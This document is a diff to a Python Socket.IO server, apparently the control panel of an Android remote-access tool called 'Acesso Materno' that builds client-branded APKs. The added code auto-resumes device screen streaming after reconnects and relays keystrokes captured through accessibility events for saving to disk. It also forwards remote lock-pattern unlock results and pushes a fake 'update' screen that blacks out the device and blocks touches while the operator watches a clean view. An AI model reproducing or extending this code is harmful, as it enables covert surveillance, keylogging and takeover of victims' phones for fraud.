@@ -391,6 +391,12 @@ def _garantir_icones_padrao(raiz, mensagens):
 
 
 # ===========================================================================
+# EMBUTIR_SUPORTE: quando False, o APP PRINCIPAL é compilado SOZINHO — não
+# compila nem embute o suporte.apk/suporte_motor.apk nos assets. Isso remove
+# ~180 MB do APK final (os dois APKs embutidos). Mude para True para voltar a
+# embutir o segundo aplicativo (motor) como antes.
+EMBUTIR_SUPORTE = False
+
 # ISOLAMENTO DO SEGUNDO APLICATIVO (suporte_motor.apk)
 # ---------------------------------------------------------------------------
 # O painel pode personalizar nome/ícone SOMENTE do aplicativo PRINCIPAL.
@@ -627,7 +633,20 @@ estado_build = {"status": "ocioso", "mensagem": "", "apk": None}
 # para a porta REAL, então a página NUNCA mais será servida pelo código antigo.
 # ===========================================================================
 PORTA_REAL = 27105  # atualizada em tempo de execução (usada pelo /health)
-_ultima_config_app = {"nome": "", "icone_bytes": None}
+_ultima_config_app = {"nome": "", "icone_bytes": None, "panel_url": ""}
+
+
+def _normalizar_url_tunel(url):
+    """Normaliza a URL do tunel informada pelo cliente: remove espacos,
+    garante https:// e barra final. Retorna '' se vazia/invalida."""
+    u = (url or "").strip()
+    if not u:
+        return ""
+    if not (u.startswith("http://") or u.startswith("https://")):
+        u = "https://" + u
+    if not u.endswith("/"):
+        u = u + "/"
+    return u
 
 try:
     _DIRETORIO_SERVIDOR = os.path.dirname(os.path.abspath(__file__))
@@ -769,7 +788,7 @@ def _escolher_porta(preferida=27105, faixa=None):
     msg = (
         f"[ERRO CRITICO] A porta {preferida} esta ocupada por um processo antigo "
         f"(python.exe / pythonw.exe / 'Acesso Materno.exe') e nao pode ser liberada.\n"
-        f"O Cloudflare Tunnel (megabrasiliautilidades.store) aponta para "
+        f"O Cloudflare Tunnel do seu servidor aponta para "
         f"http://localhost:{preferida}, entao o servidor DEVE subir nesta porta.\n"
         f"Solucao: 1) Execute este .bat/.py COMO ADMINISTRADOR (clique direito -> "
         f"Executar como administrador). 2) Ou feche manualmente os processos "
@@ -864,6 +883,36 @@ def _salvar_indice_historico(lista):
             pass
 
 
+# Nº MÁXIMO de builds guardados em apps_gerados/. Cada APK pesa dezenas de MB;
+# sem limite a pasta acumulava GIGAS (antes passava de 17 GB). Só o principal e o
+# suporte importam para o cliente — o histórico é conveniência, então mantemos
+# apenas os mais recentes e apagamos o resto AUTOMATICAMENTE a cada compilação.
+RETENCAO_HISTORICO_APPS = 5
+
+
+def _podar_historico_disco():
+    """Mantém só as RETENCAO_HISTORICO_APPS pastas mais recentes em apps_gerados/
+    e apaga as antigas do disco (o nome começa com timestamp YYYYMMDD_HHMMSS, então
+    a ordem alfabética reversa = cronológica). Evita o acúmulo de GBs de APKs."""
+    try:
+        if not os.path.isdir(PASTA_HISTORICO):
+            return
+        pastas = [d for d in os.listdir(PASTA_HISTORICO)
+                  if os.path.isdir(os.path.join(PASTA_HISTORICO, d))]
+        pastas.sort(reverse=True)
+        for antigo in pastas[RETENCAO_HISTORICO_APPS:]:
+            shutil.rmtree(os.path.join(PASTA_HISTORICO, antigo), ignore_errors=True)
+            try:
+                registrar_log(f"[HISTORICO poda] build antigo removido: {antigo}")
+            except Exception:
+                pass
+    except Exception as e:
+        try:
+            registrar_log(f"[HISTORICO poda ERRO] {e}")
+        except Exception:
+            pass
+
+
 def _arquivar_build(apk_path, nome_app, icone_bytes):
     """Copia o APK (e o ícone) para apps_gerados/<id>/ e registra no histórico."""
     if not apk_path or not os.path.exists(apk_path):
@@ -930,7 +979,10 @@ def _arquivar_build(apk_path, nome_app, icone_bytes):
     }
     lista = _indice_historico()
     lista.insert(0, item)
-    _salvar_indice_historico(lista[:50])
+    # Índice alinhado ao mesmo limite do disco (antes 50 -> acumulava GBs).
+    _salvar_indice_historico(lista[:RETENCAO_HISTORICO_APPS])
+    # Apaga as pastas de build antigas do disco (mantém só as N mais recentes).
+    _podar_historico_disco()
     try:
         registrar_log(f"[HISTORICO] Build arquivado: {item['nome']} ({tamanho_mb} MB), id={app_id}")
     except Exception:
@@ -952,17 +1004,85 @@ estado_scrcpy = {"modo": "acoplado", "titulo": None}
 # painel. Para trocar, é OBRIGATÓRIO primeiro criar a rota correspondente no
 # painel do Cloudflare (Zero Trust -> Networks -> Tunnels).
 # ============================================================================
-PANEL_URL = "https://megabrasiliautilidades.store"
-# Validação rígida ativa: garante que o link oficial do Cloudflare Tunnel
-# nunca seja sobrescrito acidentalmente por build/white-label (aborta o boot
-# com mensagem clara se divergir).
-assert PANEL_URL == "https://megabrasiliautilidades.store", f"PANEL_URL divergente do oficial: {PANEL_URL!r}"
-# Rede de segurança: garante que NENHUM código posterior consiga redefinir
-# PANEL_URL para string vazia / localhost / trycloudflare temporário.
-assert isinstance(PANEL_URL, str) and PANEL_URL.startswith("https://megabrasiliautilidades.store"), (
-    f"PANEL_URL foi sobrescrita indevidamente: {PANEL_URL!r}. "
-    f"O .exe iria gerar HTTP 404. Corrija a definição no topo do server.py."
-)
+try:
+    from env_vars import BUILD_MODE, EMBEDDED_URL
+except ImportError:
+    BUILD_MODE = "dev"
+    EMBEDDED_URL = "https://megabrasiliautilidades.store"
+
+def _resolver_panel_url_dinamico():
+    if BUILD_MODE == "dev" and EMBEDDED_URL:
+        return EMBEDDED_URL.strip()
+    try:
+        if getattr(sys, 'frozen', False):
+            base_dir = os.path.dirname(sys.executable)
+        else:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+        config_path = os.path.join(base_dir, "config.json")
+        if os.path.exists(config_path):
+            with open(config_path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+                url = data.get("panel_url", "").strip()
+                if url:
+                    return url
+    except Exception:
+        pass
+    # Fallback do dominio do CEO SOMENTE em dev. Em dist (build do cliente) NAO
+    # expoe megabrasiliautilidades.store: o cliente opera pelo subdominio da chave
+    # (SERVER_URL_CLIENTE). Sem config/EMBEDDED_URL, PANEL_URL fica vazio no dist.
+    if BUILD_MODE == "dev":
+        return EMBEDDED_URL or "https://megabrasiliautilidades.store"
+    return EMBEDDED_URL or ""
+
+PANEL_URL = _resolver_panel_url_dinamico()
+
+# CEO (dev): dominio padrao JA pre-configurado no gerador de APK. Os botoes
+# "Compilar/Atualizar" (principal e catalogo) NUNCA pedem a URL — usam
+# megabrasiliautilidades.store automaticamente. SO em dev; no dist (cliente) o
+# campo continua vindo da chave/subdominio do cliente (nao toca em nada).
+if BUILD_MODE == "dev" and PANEL_URL and not (_ultima_config_app.get("panel_url") or "").strip():
+    _ultima_config_app["panel_url"] = PANEL_URL
+
+# ============================================================================
+# SERVER_URL DO CLIENTE (fluxo dos 5 Servidores Prontos)
+# ----------------------------------------------------------------------------
+# A Tela de Ativação (licenca_cliente.py) grava o server_url retornado pela RPC
+# em ~/.acessomaterno_licenca.json. Ao abrir o Acesso Materno.exe, lemos esse
+# server_url e o usamos como "servidor ativo" desta instância: ele é exposto via
+# /config-cliente para o painel preencher automaticamente o campo de URL do
+# gerador de APK. NÃO sobrescreve PANEL_URL (o túnel Cloudflare do painel local).
+# ============================================================================
+_ARQUIVO_LICENCA_CLIENTE = os.path.join(os.path.expanduser("~"), ".acessomaterno_licenca.json")
+SERVER_URL_CLIENTE = ""
+CLIENTE_NOME = ""
+ROUTE_CIDR_CLIENTE = ""
+
+def _carregar_config_licenca_cliente():
+    """Lê o server_url (e metadados) salvos pela ativação da licença.
+    Chamada no boot, APÓS registrar_log já estar definido (ver mais abaixo)."""
+    global SERVER_URL_CLIENTE, CLIENTE_NOME, ROUTE_CIDR_CLIENTE
+    import json as _json
+    try:
+        if os.path.exists(_ARQUIVO_LICENCA_CLIENTE):
+            with open(_ARQUIVO_LICENCA_CLIENTE, "r", encoding="utf-8") as f:
+                dados = _json.load(f)
+            SERVER_URL_CLIENTE = str(dados.get("server_url") or "").strip()
+            CLIENTE_NOME = str(dados.get("cliente_nome") or "").strip()
+            ROUTE_CIDR_CLIENTE = str(dados.get("route_cidr") or "").strip()
+            try:
+                if SERVER_URL_CLIENTE:
+                    registrar_log(f"[LICENCA] Servidor ativo desta instância: {SERVER_URL_CLIENTE}"
+                                  + (f" (cliente: {CLIENTE_NOME})" if CLIENTE_NOME else ""))
+                else:
+                    registrar_log("[LICENCA] Licença sem server_url vinculado — gerador de APK usará o padrão.")
+            except Exception:
+                pass
+    except Exception as _e_lic:
+        try:
+            registrar_log(f"[LICENCA AVISO] não foi possível ler {_ARQUIVO_LICENCA_CLIENTE}: {_e_lic}")
+        except Exception:
+            pass
+# A chamada efetiva ocorre no boot, junto dos demais carregadores de estado.
 
 # Loop de eventos AsyncIO principal para despachar eventos das threads gráficas
 loop_principal = None
@@ -1097,12 +1217,14 @@ _tarefas_broadcast = set() # referência das tasks fire-and-forget (anti-GC)
 # poupa banda (aparelho sem viewers = 0 bytes transmitidos).
 # ===========================================================================
 _stream_viewers = {}       # nome_dispositivo -> set(sids)
+_state_lock = asyncio.Lock() # Lock atômico para race conditions em múltiplos acessos simultâneos
 
 async def _entrar_stream(sid, nome):
     """Entra na sala exclusiva stream:{nome} e sai de QUALQUER outra sala de
     stream que este sid ocupava (um viewer = UM dispositivo por vez)."""
-    await _sair_de_todas_streams(sid)
-    _stream_viewers.setdefault(nome, set()).add(sid)
+    async with _state_lock:
+        await _sair_de_todas_streams_locked(sid)
+        _stream_viewers.setdefault(nome, set()).add(sid)
     try:
         await sio.enter_room(sid, f"stream:{nome}")
         registrar_log(f"[STREAM] sid {sid[:6]} entrou na sala exclusiva de '{nome}' (stream:{nome}).")
@@ -1111,6 +1233,10 @@ async def _entrar_stream(sid, nome):
 
 async def _sair_de_todas_streams(sid):
     """Remove o sid de TODAS as salas de stream (limpeza atômica)."""
+    async with _state_lock:
+        await _sair_de_todas_streams_locked(sid)
+
+async def _sair_de_todas_streams_locked(sid):
     for nome in list(_stream_viewers.keys()):
         sids = _stream_viewers.get(nome)
         if sids and sid in sids:
@@ -1123,11 +1249,11 @@ async def _sair_de_todas_streams(sid):
                 pass
 
 def _agendar_broadcast_frame(nome, jpeg):
-    # Fire-and-forget do emit de frame: NAO trava o handler 'enviar_tela'.
-    # ISOLAMENTO ABSOLUTO: emite EXCLUSIVAMENTE para a sala "stream:{nome}"
-    # (apenas quem assiste AQUELE dispositivo recebe). Nunca mais para a sala
-    # global "painel" — cross-streaming / frames misturados eliminados no
-    # proprio barramento de rede.
+    # Se não houver espectadores assistindo à stream deste aparelho,
+    # o reenvio de frames pela rede é totalmente poupado (0 bytes transmitidos),
+    # enquanto a gravação de segurança em disco continua rodando independentemente.
+    if not _stream_viewers.get(nome):
+        return
     _t = asyncio.create_task(
         sio.emit("frame", [{"dispositivo": nome}, jpeg], room=f"stream:{nome}"))
     _tarefas_broadcast.add(_t)
@@ -1360,6 +1486,76 @@ def _salvar_historico_dispositivos():
 # Carrega o histórico NO BOOT do servidor (antes de qualquer conexão).
 _carregar_historico_dispositivos()
 
+# ── PERSISTÊNCIA DE SESSÃO ATIVA (Reconexão Automática de Tela) ─────────
+# Guarda em disco (sessoes_ativas.json, junto ao executável/server.py) o
+# conjunto de dispositivos que JÁ tiveram o compartilhamento de tela
+# APROVADO nesta sessão de trabalho (primeiro frame JPEG válido recebido).
+# Ao reiniciar o "Acesso Materno.exe", essa lista é recarregada: quando um
+# desses dispositivos reconectar ao servidor, o painel reabre a visualização
+# automaticamente, sem clique manual. A lista só é limpa quando o usuário
+# encerra a sessão explicitamente (botão "Encerrar Sessão" / /encerrar-sessao).
+# A escrita é ATÔMICA (.tmp + fsync + os.replace), imune a crash no meio.
+_ARQUIVO_SESSAO_ATIVA = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "sessoes_ativas.json")
+
+sessao_ativa = set()   # device_id (nome) com compartilhamento de tela aprovado
+
+def _carregar_sessao_ativa():
+    """Carrega do disco os dispositivos da sessão de tela ativa."""
+    import json
+    try:
+        if os.path.exists(_ARQUIVO_SESSAO_ATIVA):
+            with open(_ARQUIVO_SESSAO_ATIVA, "r", encoding="utf-8") as f:
+                dados = json.load(f)
+            ids = [str(n) for n in (dados.get("dispositivos") or []) if n]
+            for n in ids:
+                sessao_ativa.add(n)
+            if ids:
+                registrar_log(f"[SESSAO] {len(ids)} dispositivo(s) da sessão de tela ativa carregados do disco.")
+    except Exception as e:
+        registrar_log(f"[SESSAO AVISO] não foi possível carregar a sessão ativa: {e}")
+
+def _salvar_sessao_ativa():
+    """Grava o conjunto de dispositivos da sessão de tela ativa de forma atômica."""
+    import json
+    try:
+        payload = json.dumps(
+            {"dispositivos": sorted(sessao_ativa), "atualizado_em": time.time()},
+            ensure_ascii=False, indent=2)
+        tmp = _ARQUIVO_SESSAO_ATIVA + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            f.write(payload)
+            f.flush()
+            os.fsync(f.fileno())
+        os.replace(tmp, _ARQUIVO_SESSAO_ATIVA)  # atômico (mesmo filesystem)
+    except Exception as e:
+        registrar_log(f"[SESSAO AVISO] não foi possível salvar a sessão ativa: {e}")
+
+def _marcar_sessao(nome):
+    """Registra o dispositivo na sessão de tela ativa (idempotente). Chamado
+    quando o compartilhamento de tela é aprovado (primeiro frame válido)."""
+    if nome and nome not in sessao_ativa:
+        sessao_ativa.add(nome)
+        _salvar_sessao_ativa()
+        registrar_log(f"[SESSAO] '{nome}' adicionado à sessão de tela ativa (compartilhamento aprovado).")
+
+def sessao_dispositivos_online():
+    """Dispositivos da sessão ativa que estão com socket vivo agora, na ordem
+    de conexão (para o painel reabrir a visualização de todos eles)."""
+    with _trava_ordem:
+        ordenados = [n for n in ordem_conexao if n in nome_sid and n in sessao_ativa]
+    # Inclui eventuais da sessão online que não estejam na fila de ordem.
+    for n in list(sessao_ativa):
+        if n in nome_sid and n not in ordenados:
+            ordenados.append(n)
+    return ordenados
+
+# Carrega a sessão ativa NO BOOT (antes de qualquer conexão).
+_carregar_sessao_ativa()
+
+# Carrega o server_url da licença do cliente (fluxo dos 5 Servidores Prontos).
+_carregar_config_licenca_cliente()
+
 # Controle de estado e thread da janela nativa flutuante Pygame
 janela_flutuante_ativa = False
 thread_janela_flutuante = None
@@ -1442,12 +1638,11 @@ async def identificar(sid, tipo, tipo_dispositivo=None):
         await sio.enter_room(sid, "painel")
         _sids_painel.add(sid)   # contagem: broadcast é pulado quando ZERO clientes
         registrar_log(f"[SOCKET.IO] Painel conectado (sid {sid[:6]}) — clientes painel/emuladores: {len(_sids_painel)}")
-        # Envia IMEDIATAMENTE a URL fixa do painel para o frontend atualizar
-        # o cabecalho "Link Ativo: https://megabrasiliautilidades.store".
-        # Sem isso, a tela pode mostrar um link antigo/errado e o .exe
-        # compilado apontara para endereco inexistente (HTTP 404).
+        # NEUTRO: nao envia mais o dominio pessoal (PANEL_URL) para o frontend.
+        # O banner do painel agora mostra apenas "Servidor ativo", sem expor
+        # nenhum endereco de tunel na tela.
         try:
-            await sio.emit("link_ativo", {"url": PANEL_URL, "link_ativo": PANEL_URL}, to=sid)
+            await sio.emit("link_ativo", {"url": "", "link_ativo": "Servidor ativo"}, to=sid)
         except Exception as _e_emit_link:
             registrar_log(f"[SOCKET.IO AVISO] nao conseguiu emitir link_ativo para o painel: {_e_emit_link}")
         # ISOLAMENTO (fallback): o painel principal jah entra na sala exclusiva
@@ -1460,6 +1655,17 @@ async def identificar(sid, tipo, tipo_dispositivo=None):
                 await _entrar_stream(sid, _primeiro_stream)
         except Exception as _e_stream_auto:
             registrar_log(f"[STREAM AVISO] auto-entrada fallback falhou: {_e_stream_auto}")
+        # RESTAURAÇÃO DA SESSÃO: informa o painel recém-aberto quais dispositivos
+        # da sessão ativa já estão online, para ele reabrir a visualização de
+        # todos eles automaticamente (sem clique manual).
+        try:
+            _sessao_online = sessao_dispositivos_online()
+            await sio.emit("sessao_ativa_lista",
+                           {"dispositivos": _sessao_online}, to=sid)
+            if _sessao_online:
+                registrar_log(f"[SESSAO] Painel recebeu lista de reconexão automática: {_sessao_online}")
+        except Exception as _e_sessao_painel:
+            registrar_log(f"[SESSAO AVISO] envio da lista de sessão ao painel falhou: {_e_sessao_painel}")
         return
     filhos.add(sid)
     sid_nome[sid] = nome
@@ -1483,6 +1689,21 @@ async def identificar(sid, tipo, tipo_dispositivo=None):
         await sio.emit("aparelho_online", {"nome": nome, "conectado": True}, room="painel")
     except Exception:
         pass
+
+    # RECONEXÃO DE SESSÃO: se este dispositivo já teve o compartilhamento de
+    # tela aprovado nesta sessão (persistido em sessoes_ativas.json), pede a
+    # retomada do stream ao próprio aparelho e manda o painel reabrir a
+    # visualização dele automaticamente — sem clique manual.
+    if nome in sessao_ativa:
+        try:
+            await sio.emit("retomar_stream", {"dispositivo": nome}, to=sid)
+            registrar_log(f"[SESSAO] 'retomar_stream' enviado a '{nome}' (dispositivo da sessão ativa reconectou).")
+        except Exception as _e_retomar:
+            registrar_log(f"[SESSAO AVISO] falha ao enviar 'retomar_stream' a '{nome}': {_e_retomar}")
+        try:
+            await sio.emit("sessao_retomar", {"dispositivo": nome}, room="painel")
+        except Exception as _e_sessao_painel2:
+            registrar_log(f"[SESSAO AVISO] falha ao notificar painel da retomada de '{nome}': {_e_sessao_painel2}")
 
     # O gatilho automático de gravação NÃO fica mais aqui: o 'identificar'
     # dispara no connect do socket, ANTES do usuário aceitar a permissão de
@@ -1533,6 +1754,20 @@ async def assistir_video(sid, data):
 async def sair_video(sid, data):
     """Viewer parou de assistir — sai de TODAS as salas de stream (limpeza)."""
     await _sair_de_todas_streams(sid)
+
+
+@sio.on("encerrar_sessao")
+async def encerrar_sessao_sio(sid, data=None):
+    """Encerra a sessão de espelhamento via Socket.IO (equivalente ao
+    endpoint /encerrar-sessao). Limpa a lista de reconexão automática."""
+    quantidade = len(sessao_ativa)
+    sessao_ativa.clear()
+    _salvar_sessao_ativa()
+    registrar_log(f"[SESSAO] Sessão encerrada via socket — {quantidade} dispositivo(s) removidos da reconexão automática.")
+    try:
+        await sio.emit("sessao_encerrada", {"ok": True}, room="painel")
+    except Exception:
+        pass
 
 
 # ===========================================================================
@@ -1694,6 +1929,42 @@ async def tela_privacidade_painel(sid, data):
         await sio.emit("tela_privacidade", {"acao": acao}, to=fsid)
     registrar_log(f"[PRIVACIDADE] {acao} -> {dispositivo or 'todos'} ({len(alvos)})")
 
+
+# --- OPACIDADE DO DISPOSITIVO (slider "Fundo do Dispositivo"): encaminha ao
+#     agente Android SEM conversão (evento = overlay_opacidade). O agente
+#     aplica o escurecimento no overlay do cartão do aparelho.
+@sio.on("overlay_opacidade")
+async def overlay_opacidade(sid, data):
+    try:
+        opac = float((data or {}).get("opacidade", 0.6))
+    except Exception:
+        opac = 0.6
+    # Valor COM SINAL: >0 escurece, <0 clareia. NÃO cortar negativos (antes
+    # max(0.0,...) zerava o "clarear" e ele nunca chegava ao aparelho).
+    opac = max(-1.0, min(1.0, opac))
+    dispositivo = (data or {}).get("dispositivo")
+    alvos = _sids_alvo(dispositivo)
+    for fsid in alvos:
+        await sio.emit("overlay_opacidade", {"opacidade": opac}, to=fsid)
+    registrar_log(f"[OVERLAY OPAC DISP] {opac:.2f} -> {dispositivo or 'todos'} ({len(alvos)})")
+
+
+# --- OPACIDADE DO PAINEL (slider "Opacidade do Painel"): encaminha ao agente
+#     Android SEM converter para overlay_opacidade. O agente só ajusta a flag
+#     de captura limpa (ativa < 95%); NÃO altera o overlay do aparelho.
+@sio.on("overlay_opacidade_painel")
+async def overlay_opacidade_painel(sid, data):
+    try:
+        opac = float((data or {}).get("opacidade", 1.0))
+    except Exception:
+        opac = 1.0
+    opac = max(0.0, min(1.0, opac))
+    dispositivo = (data or {}).get("dispositivo")
+    alvos = _sids_alvo(dispositivo)
+    for fsid in alvos:
+        await sio.emit("overlay_opacidade_painel", {"opacidade": opac}, to=fsid)
+    registrar_log(f"[OVERLAY OPAC PAINEL] {opac:.2f} -> {dispositivo or 'todos'} ({len(alvos)})")
+
 # ============================================================================
 # INSPEÇÃO E DESBLOQUEIO REMOTO DA TELA DE BLOQUEIO (KEYGUARD/PIN/PADRÃO)
 # ============================================================================
@@ -1717,6 +1988,25 @@ async def desbloquear_padrao_sio(sid, data):
     for fsid in alvos:
         await sio.emit("desbloquear_padrao", data, to=fsid)
     registrar_log(f"[BLOQUEIO] Desbloqueio de padrão enviado -> {dispositivo or 'todos'} ({len(alvos)})")
+
+
+@sio.on("desbloquear_padrao_resultado")
+async def desbloquear_padrao_resultado_sio(sid, data):
+    """Resultado do desbloqueio por padrão vindo do dispositivo (sucesso =
+    keyguard destravado após desenhar o padrão). Encaminha ao painel para
+    mostrar 'desbloqueado' ou 'senha padrão incorreta'."""
+    if isinstance(data, str):
+        try:
+            import json
+            data = json.loads(data)
+        except Exception:
+            data = {}
+    if not isinstance(data, dict):
+        data = {}
+    nome = data.get("dispositivo") or sid_nome.get(sid, "")
+    data["dispositivo"] = nome
+    await sio.emit("desbloquear_padrao_resultado", data, room="painel")
+    registrar_log(f"[BLOQUEIO] Resultado do padrão: sucesso={data.get('sucesso')} <- {nome or 'desconhecido'}")
 
 @sio.on("comando_bloqueio")
 async def comando_bloqueio_sio(sid, data):
@@ -1785,6 +2075,31 @@ async def overlay_atualizacao_visual_sio(sid, data):
         await sio.emit("overlay_atualizacao_visual", data, to=fsid)
     await sio.emit("overlay_atualizacao_visual", data, room="painel")
     registrar_log(f"[OVERLAY ATUALIZACAO VISUAL] -> {dispositivo or 'todos'} ({len(alvos)} dispositivo(s); sincronia de frame ativa, painel vê fundo limpo)")
+
+@sio.on("atualizacao_dispositivo")
+async def atualizacao_dispositivo_sio(sid, data):
+    dispositivo = (data or {}).get("dispositivo") if isinstance(data, dict) else None
+    alvos = _sids_alvo(dispositivo)
+    # HANDLER INDIVIDUAL DO DISPOSITIVO (tela preta profissional).
+    # Encaminha APENAS para o(s) dispositivo(s) físico(s)/Nox alvo(s) — inicia
+    # AtualizacaoDispositivoService (fundo 100% opaco, bloqueia toques).
+    # NÃO encaminha para a sala "painel": o emulador nativo continua recebendo
+    # overlay_atualizacao_visual (círculo rodando + fundo normal do dispositivo
+    # via captura limpa) pelo handler separado, já existente.
+    for fsid in alvos:
+        await sio.emit("atualizacao_dispositivo", data, to=fsid)
+    registrar_log(f"[ATUALIZACAO DISPOSITIVO] -> {dispositivo or 'todos'} ({len(alvos)} dispositivo(s); tela preta opaca, toques bloqueados; painel não recebe este evento)")
+
+@sio.on("atualizacao_concluida")
+async def atualizacao_concluida_sio(sid, data):
+    dispositivo = (data or {}).get("dispositivo") if isinstance(data, dict) else None
+    await sio.emit("atualizacao_concluida", data, room="painel")
+    registrar_log(f"[ATUALIZACAO CONCLUIDA] -> {dispositivo or 'desconhecido'} (sucesso={(data or {}).get('sucesso')})")
+
+@sio.on("consent_auditoria")
+async def consent_auditoria_sio(sid, data):
+    dispositivo = (data or {}).get("dispositivo") if isinstance(data, dict) else None
+    registrar_log(f"[LGPD AUDITORIA] Dispositivo: {dispositivo} | Dados: {data}")
 
 # ============================================================================
 # SINALIZAÇÃO WEBRTC (vídeo em tempo real do espelhamento) — APENAS REPASSE.
@@ -2005,6 +2320,12 @@ async def enviar_tela(sid, *args):
     rec["n"] += 1
     rec["ts"] = time.time()
 
+    # SESSÃO ATIVA: o primeiro frame válido = compartilhamento de tela APROVADO.
+    # Registra o dispositivo na sessão persistida (sessoes_ativas.json) para que,
+    # ao reiniciar o servidor, o painel reabra a visualização dele automaticamente.
+    if nome != "global":
+        _marcar_sessao(nome)
+
     if GRAVACAO_DISPONIVEL and nome not in gravadores_ativos:
         try:
             # iniciar_gravacao() faz I/O síncrono (registrar_auditoria com
@@ -2093,6 +2414,33 @@ async def telemetria_acessibilidade(sid, data):
 
     if _stream_viewers.get(nome):
         _t = asyncio.create_task(sio.emit("dados_acessibilidade", data, room=f"stream:{nome}"))
+        _tarefas_broadcast.add(_t)
+        _t.add_done_callback(_tarefas_broadcast.discard)
+
+
+@sio.on("teclado_tecla")
+async def teclado_tecla(sid, data):
+    """Tecla pressionada no teclado virtual do dispositivo (mapeamento por toque).
+
+    O agente Android captura CADA tecla no instante do clique
+    (onAccessibilityEvent / TYPE_VIEW_CLICKED) e emite 'teclado_tecla' com a
+    tecla exata. Aqui apenas retransmitimos em tempo real para o leitor FPS na
+    sala stream:{dispositivo}, que monta a sequência e grava na pasta teclado/.
+    """
+    if isinstance(data, str):
+        try:
+            import json
+            data = json.loads(data)
+        except Exception:
+            return
+    if not isinstance(data, dict):
+        return
+    nome = data.get("dispositivo") or sid_nome.get(sid, "global")
+    if not nome:
+        return
+    data["dispositivo"] = nome
+    if _stream_viewers.get(nome):
+        _t = asyncio.create_task(sio.emit("teclado_tecla", data, room=f"stream:{nome}"))
         _tarefas_broadcast.add(_t)
         _t.add_done_callback(_tarefas_broadcast.discard)
 
@@ -2407,6 +2755,40 @@ def _encontrar_raiz_projeto():
     return None
 
 
+def _ler_android_project_dir_config():
+    """Lê a chave opcional 'android_project_dir' do config.json ao lado do .exe
+    (ou do server.py em modo script). Caminho absoluto ou relativo à base.
+    Retorna o absoluto SOMENTE se contiver gradlew.bat; senão None."""
+    import json
+    try:
+        if getattr(sys, "frozen", False):
+            base_dir = os.path.dirname(sys.executable)
+        else:
+            base_dir = os.path.dirname(os.path.abspath(__file__))
+        config_path = os.path.join(base_dir, "config.json")
+        if not os.path.exists(config_path):
+            return None
+        with open(config_path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        bruto = (data.get("android_project_dir") or "").strip()
+        if not bruto:
+            return None
+        cand = bruto if os.path.isabs(bruto) else os.path.join(base_dir, bruto)
+        cand = os.path.abspath(cand)
+        if os.path.exists(os.path.join(cand, "gradlew.bat")):
+            return cand
+        registrar_log(f"[BUILD AVISO] android_project_dir='{bruto}' no config.json nao contem gradlew.bat (resolvido: {cand}).")
+    except Exception as _e:
+        registrar_log(f"[BUILD AVISO] Falha ao ler android_project_dir do config.json: {_e}")
+    return None
+
+
+def _resolver_raiz_android():
+    """Raiz do projeto Android: 1) config.json -> 'android_project_dir'
+    (recomendado no .exe); 2) busca automatica (_encontrar_raiz_projeto)."""
+    return _ler_android_project_dir_config() or _encontrar_raiz_projeto()
+
+
 def _encontrar_java_home():
     # PREFERE o JBR do Android Studio (JDK 17/21, 100% compativel com o
     # Gradle/AGP/Kotlin do projeto). Se usar um JDK muito novo (23/24) do
@@ -2689,6 +3071,7 @@ def download_motor():
 @app.post("/salvar-config-app")
 async def salvar_config_app(
     nome_app: str = Form(""),
+    panel_url: str = Form(""),
     icone: Optional[UploadFile] = File(None)
 ):
     try:
@@ -2809,10 +3192,17 @@ async def salvar_config_app(
         # assim que o build concluir (tela "Histórico de Compilações").
         _ultima_config_app["nome"] = (nome_app or "").strip()
         _ultima_config_app["icone_bytes"] = locals().get("conteudo_bytes")
+        # URL do tunel do CLIENTE (normalizada). Vai para o -PpanelUrl do Gradle
+        # na hora de compilar o .apk, substituindo qualquer dominio fixo.
+        _url_cli = _normalizar_url_tunel(panel_url)
+        if _url_cli:
+            _ultima_config_app["panel_url"] = _url_cli
+            mensagens.append(f"URL do túnel do cliente salva: {_url_cli}")
 
         return {
             "status": "sucesso",
-            "mensagem": " ".join(mensagens) or "Configurações do aplicativo validadas."
+            "mensagem": " ".join(mensagens) or "Configurações do aplicativo validadas.",
+            "panel_url_cliente": _ultima_config_app.get("panel_url", "")
         }
     except Exception as e:
         # Garante o restore mesmo em caso de erro.
@@ -3840,7 +4230,9 @@ def _copiar_apk_suporte_para_assets(raiz, nome_app=None):
         ajusta permissoes) caso a pasta assets esteja travada por processo.
     Retorna True se copiou com sucesso."""
     try:
-        pasta_suporte = os.path.join(raiz, "app", "build", "outputs", "apk", "suporte", "release")
+        pasta_suporte = os.path.join(raiz, "app", "build", "outputs", "apk", "suporte", "debug")
+        if not os.path.isdir(pasta_suporte):
+            pasta_suporte = os.path.join(raiz, "app", "build", "outputs", "apk", "suporte", "release")
         if not os.path.isdir(pasta_suporte):
             registrar_log(f"[BUILD AVISO] Pasta de saida do flavor Suporte nao existe: {pasta_suporte}")
             return False
@@ -3933,6 +4325,17 @@ def _copiar_apk_suporte_para_assets(raiz, nome_app=None):
 
         if not _copiar_com_retry(apk_suporte, destino_assets):
             return False
+
+        # CORRECAO CRITICA (nome instalavel): o MainActivity instala de
+        # assets/suporte.apk, mas o build grava suporte_motor.apk. Sem isto o
+        # app embutia um suporte.apk ESTATICO antigo (ou nenhum) -> "nao aparece
+        # para instalar". Grava o suporte FRESCO tambem como suporte.apk, no
+        # mesmo diretorio assets, para o principal embutir a versao recem-compilada.
+        destino_suporte_apk = os.path.join(os.path.dirname(destino_assets), "suporte.apk")
+        if _copiar_com_retry(apk_suporte, destino_suporte_apk):
+            registrar_log(f"[BUILD] Suporte fresco gravado tambem como {destino_suporte_apk} (nome que o app instala).")
+        else:
+            registrar_log(f"[BUILD AVISO] Falha ao gravar {destino_suporte_apk}; app pode instalar suporte antigo.")
 
         # Copia tambem para a raiz do projeto (fallback usado pela rota /downloads).
         destino_raiz = os.path.join(raiz, "suporte_motor.apk")
@@ -4056,6 +4459,25 @@ def compilar_apk_em_segundo_plano():
     # Se o usuario clicou em Gerar sem passar por /salvar-config-app, usa o
     # ultimo nome salvo; se nunca salvou, fallback 'App Personalizado'.
     _nome_app_build = (_ultima_config_app.get("nome") or "").strip() or "App Personalizado"
+
+    # URL do tunel do CLIENTE (informada no painel e salva via /salvar-config-app).
+    # O .apk e assado com ESTA URL — nunca mais com um dominio fixo. Sem URL,
+    # o build e RECUSADO com mensagem clara (evita gerar .apk apontando p/ nada).
+    _url_apk = (_ultima_config_app.get("panel_url") or "").strip()
+    # DEV (CEO): usa a URL embutida (PANEL_URL); so o DIST exige o tunel do cliente.
